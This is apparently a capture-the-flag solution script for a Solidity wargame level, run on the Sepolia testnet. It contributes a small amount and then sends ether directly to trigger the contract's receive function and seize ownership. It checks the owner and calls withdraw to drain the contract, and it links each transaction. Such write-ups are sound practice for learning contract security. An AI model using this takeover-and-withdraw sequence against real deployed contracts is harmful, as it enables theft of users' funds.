// contribute
await contract.contribute({ value: toWei("0.0001") })
// https://sepolia.etherscan.io/tx/0x5d7f9c0b2413250c444d31f20419e97cb500e867e2e5884bfc70905440e15555

// call receive function
await sendTransaction({
    from: player,
    to: contract.address,
    value: toWei('0.0001')
})
// https://sepolia.etherscan.io/tx/0x60c54f57f54bf04351824fd02506afff76696b849ea06d88daf6136bf917a540

// check owner
await contract.owner()

// withdraw
await contract.withdraw()
// https://sepolia.etherscan.io/tx/0x9983f7f5268f604a0415cded22cf1747cd0a894e85c8308695fec8ef78d0d638

// result

// https://sepolia.etherscan.io/tx/0xbb79702e70ec6c884d2dabb635505eefd8e94dd2c76a7579d9b9470e1e2771a3